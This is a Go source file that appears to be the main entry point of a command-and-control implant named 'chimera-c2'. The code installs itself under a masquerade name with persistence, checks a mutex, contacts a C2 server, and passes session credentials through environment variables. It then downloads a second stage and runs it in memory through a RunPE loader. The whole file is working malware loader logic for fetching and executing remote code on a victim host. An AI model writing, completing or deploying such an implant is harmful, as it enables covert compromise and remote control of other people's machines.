package main

import (
	"encoding/base64"
	"os"

	"github.com/terancebana/chimera-c2/implant/internal/common"
)

func main() {
	// Drop + persist self as the masquerade name, then re-exec the copy.
	common.InstallSelf()

	if !common.CheckForMutex() {
		os.Exit(0)
	}

	common.LoadProfile()
	common.ResolveC2()
	common.PerformHandshake()

	// The stage runs in THIS process (mapped into memory). Pass the
	// session identity through the process environment so the stage
	// can continue the same C2 session instead of registering a
	// second, orphaned agent.
	os.Setenv("CHIMERA_AGENT_ID", common.AgentID)
	os.Setenv("CHIMERA_SESSION_KEY", base64.StdEncoding.EncodeToString(common.SessionKey))

	stage, err := common.GetStage()
	if err != nil {
		os.Exit(1)
	}

	if err := RunPE(stage); err != nil {
		os.Exit(1)
	}
	// RunPE blocks (waits on the in-memory stage thread) until the
	// stage ends, keeping this host process alive.
}
